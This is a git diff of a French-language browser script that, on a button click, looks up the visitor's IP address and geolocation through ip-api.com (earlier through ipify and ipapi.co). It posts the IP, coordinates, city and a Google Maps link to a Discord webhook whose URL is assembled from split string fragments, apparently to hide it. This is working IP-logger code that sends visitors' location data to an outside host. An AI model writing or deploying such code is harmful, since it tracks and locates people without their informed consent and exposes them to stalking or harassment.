@@ -13,83 +13,55 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
         return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
     }
 
-    // Fonction pour récupérer l'adresse IP avec ipify
-    function getIPAddress() {
-        return fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur HTTP, statut : ' + response.status);
-                }
-                return response.json();
-            })
-            .then(data => {
-                return data.ip; // Renvoie l'adresse IP au format IPv4
-            });
-    }
-
-    // Fonction pour récupérer la localisation précise avec ipapi.co
-    function getLocation(ipAddress) {
-        return fetch(`https://ipapi.co/${ipAddress}/json/`)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur HTTP, statut : ' + response.status);
-                }
-                return response.json();
-            })
-            .then(data => {
-                return {
-                    ipAddress: ipAddress,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    latitude: data.latitude,
-                    longitude: data.longitude
-                };
-            });
-    }
-
-    getIPAddress()
-        .then(ipAddress => {
-            return getLocation(ipAddress);
+    fetch('http://ip-api.com/json/')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Erreur HTTP, statut : ' + response.status);
+            }
+            return response.json();
         })
-        .then(location => {
-            let message = {
-                content: `
-                    **Utilisateur a cliqué sur le bouton**
-                    \nL'adresse IP est : ${location.ipAddress}
-                    \nLocalisation précise :
-                    \nLatitude : ${location.latitude}, Longitude : ${location.longitude}
-                    \nVille : ${location.city}, Région : ${location.region}, Pays : ${location.country}
-                    \n[Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})
-                `
-            };
+        .then(data => {
+            if (data.status === 'success') {
+                let message = {
+                    content: `
+                        **Utilisateur a cliqué sur le bouton**
+                        \nVotre adresse IP est: ${data.query}
+                        \nVotre localisation approximative est:
+                        \nLatitude: ${data.lat}, Longitude: ${data.lon}
+                        \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
+                        \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+                    `
+                };
 
-            let webhookUrl = getWebhookUrl();
+                let webhookUrl = getWebhookUrl();
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            }).then(response => {
-                if (response.ok) {
-                    alert('Les informations ont été envoyées avec succès au webhook Discord.');
-                } else {
-                    throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
-                }
-            }).catch(error => {
-                console.error('Erreur lors de l\'envoi au webhook Discord:', error);
-                alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
-            });
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                }).then(response => {
+                    if (response.ok) {
+                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
+                    } else {
+                        throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
+                    }
+                }).catch(error => {
+                    console.error('Erreur lors de l\'envoi au webhook Discord:', error);
+                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
+                });
 
-            document.getElementById('info-display').innerText = `
-                L'adresse IP est : ${location.ipAddress}
-                \nLocalisation précise :
-                \nLatitude : ${location.latitude}, Longitude : ${location.longitude}
-                \nVille : ${location.city}, Région : ${location.region}, Pays : ${location.country}
-                \n[Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})
-            `;
+                document.getElementById('info-display').innerText = `
+                    Votre adresse IP est: ${data.query}
+                    \nVotre localisation approximative est:
+                    \nLatitude: ${data.lat}, Longitude: ${data.lon}
+                    \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
+                    \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+                `;
+            } else {
+                throw new Error('Erreur API : ' + data.message);
+            }
         })
         .catch(error => {
             document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations : ' + error.message;
